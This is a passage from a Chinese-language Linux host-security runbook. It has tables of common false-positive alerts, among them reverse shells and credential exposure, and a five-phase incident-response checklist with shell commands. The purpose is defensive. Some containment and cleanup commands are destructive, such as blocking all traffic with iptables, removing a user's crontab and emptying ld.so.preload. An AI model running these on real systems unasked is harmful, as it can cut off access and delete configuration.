| **开发机（Docker Desktop）** | 已删除二进制、overlay 文件系统异常 | `cat /proc/1/cgroup \| grep docker` | 容器白名单 |
| **容器环境** | PID 1 非 systemd、缺少日志服务 | `cat /proc/1/cmdline` 查看容器入口 | 容器场景预期行为 |
| **CI/CD 流水线** | /tmp 执行、短生命周期进程、异常用户 | 检查进程属于 CI runner 用户 | 加入 CI 白名单 |
| **云主机（AWS）** | cloud-init 相关进程、SSM Agent | `systemctl status amazon-ssm-agent` | 云厂商标准组件 |
| **云主机（阿里云）** | aliyun-service、AliYunDun 进程 | `rpm -qi aegis` 或确认安骑士 | 加入云厂商白名单 |
| **生产服务器** | 运维自动化工具、监控 Agent | 确认进程属主和来源 | 纳入基线 |

### 按告警类型的高频误报

| 告警类型 | 误报场景 | 判定方法 | 处置 |
|----------|----------|----------|------|
| 已删除二进制 | 软件更新过程中 | `rpm -V` 或 `dpkg -V` | 更新完成后重扫 |
| 异常进程路径 | pip/npm 构建临时文件 | 父进程为 pip/node | 忽略 |
| 反弹 Shell | SSH 端口转发/隧道 | 确认 sshd 子进程 | 加入白名单 |
| SUID 异常 | 系统默认 SUID 文件 | `dpkg -S` 确认包来源 | 纳入基线 |
| 异常 crontab | logrotate/apt 自动任务 | 包管理器验证 | 忽略 |
| 凭据暴露 | 示例配置文件/模板 | grep 占位符关键字 | 忽略 |
| UID 0 用户 | 历史遗留 toor 账户 | 检查是否有活动登录 | 评估后决定 |
| 日志空白 | 系统重启/logrotate | `last reboot`、检查 rotate 时间 | 确认后忽略 |
| 高 CPU 进程 | 合法计算任务（编译/压缩） | 确认进程命令行 | 忽略 |
| DNS 异常 | CDN/防病毒的高频查询 | 确认查询域名归属 | 加入白名单 |

---

## 11. 应急响应清单

收到 **P0/P1** 告警后，按以下流程执行：

### Phase 1: 确认（5 分钟内）

```bash
# 快速确认告警真伪
ps auxwwf                                    # 进程快照
ss -tnp                                      # 网络连接
ls -la /proc/*/exe 2>/dev/null | grep deleted # 已删除二进制
last -i | head -10                           # 最近登录
```

### Phase 2: 遏制（15 分钟内）

```bash
# 隔离受影响系统
# 方式一：网络层隔离（推荐）
iptables -I INPUT -j DROP
iptables -I INPUT -s <管理IP> -j ACCEPT
iptables -I OUTPUT -j DROP
iptables -I OUTPUT -d <管理IP> -j ACCEPT

# 方式二：Kill 恶意进程
kill -9 <malicious_pid>

# 方式三：禁用被入侵账户
passwd -l <compromised_user>
```

### Phase 3: 清除

```bash
# 清除恶意文件和持久化
rm -f <malicious_files>
crontab -u <user> -r                  # 清除恶意 crontab
systemctl disable <malicious_service> # 禁用恶意服务
cat /dev/null > /etc/ld.so.preload    # 清除 LD_PRELOAD
# 逐一排查所有持久化点（cron、systemd、rc.local、bashrc、authorized_keys）
```

### Phase 4: 恢复

- 从可信备份恢复被篡改的文件
- 重置所有可能泄露的凭据
- 验证系统完整性后逐步恢复网络
- 持续监控 24-48 小时确认威胁已消除

### Phase 5: 复盘

- 记录完整时间线（入侵时间、发现时间、响应时间）
- 分析入侵入口和攻击路径
- 总结检测盲区，更新检测规则
- 输出事件报告，更新安全基线

---

## 12. 参考资源

- **MITRE ATT&CK for Linux**：https://attack.mitre.org/matrices/enterprise/linux/
- **CIS Benchmark**：https://www.cisecurity.org/cis-benchmarks
- **GTFOBins（SUID 利用参考）**：https://gtfobins.github.io/
- **sec-userspace 白名单管理指南**：[whitelist-management.md](whitelist-management.md)
- **NIST SP 800-61（事件响应指南）**：https://csrc.nist.gov/pubs/sp/800/61/r2/final
- **VirusTotal（文件/IP 信誉查询）**：https://www.virustotal.com/
- **AbuseIPDB（IP 信誉查询）**：https://www.abuseipdb.com/
